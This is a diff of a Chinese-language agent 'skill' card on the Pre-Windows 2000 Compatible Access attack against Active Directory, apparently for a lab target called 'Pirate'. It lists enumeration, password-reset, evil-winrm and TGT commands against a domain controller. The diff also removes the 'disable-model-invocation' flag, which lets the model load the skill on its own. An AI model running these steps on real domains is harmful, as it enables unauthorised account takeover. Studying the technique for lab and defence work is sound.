@@ -1,10 +1,9 @@
 ---
 name: 'pre2k-attack'
-description: 'Pre-Windows 2000 Compatible Access 攻击：枚举、密码公式、利用步骤、工具。Pirate靶机关键初始访问技术。'
-disable-model-invocation: true
+description: 'Pre-Windows 2000 Compatible Access 攻击：枚举、密码公式、利用步骤、工具。Pirate靶机关键初始访问技术。（检索词：pre2k attack）'
 metadata: { domain: ad-win, tier: T2 }
 ---
-> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。
+> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
 
 ## Pre-Windows 2000 Compatible Access 攻击
 
@@ -23,7 +22,7 @@ pre2k unauth -dc-ip <DC_IP> -d <domain>
 
 # 方法3: 手动识别 UAC 4128
 # userAccountControl = 4128 (WORKSTATION_TRUST_ACCOUNT + 特定 flag)
-```text
+```
 
 ### 利用
 ```bash
@@ -37,7 +36,7 @@ impacket-changepasswd <domain>/'<COMPUTER>$'@<DC_IP> -newpass 'NewPass123!' -p r
 evil-winrm -i <DC_IP> -u '<COMPUTER>$' -p 'NewPass123!'
 # 或获取 TGT
 impacket-getTGT <domain>/'<COMPUTER>$':'NewPass123!' -dc-ip <DC_IP>
-```text
+```
 
 ### 为什么危险
 - pre2k 账户通常是 "Pre-Windows 2000 Compatible Access" 组成员 → 拥有对域对象的扩展读取权限
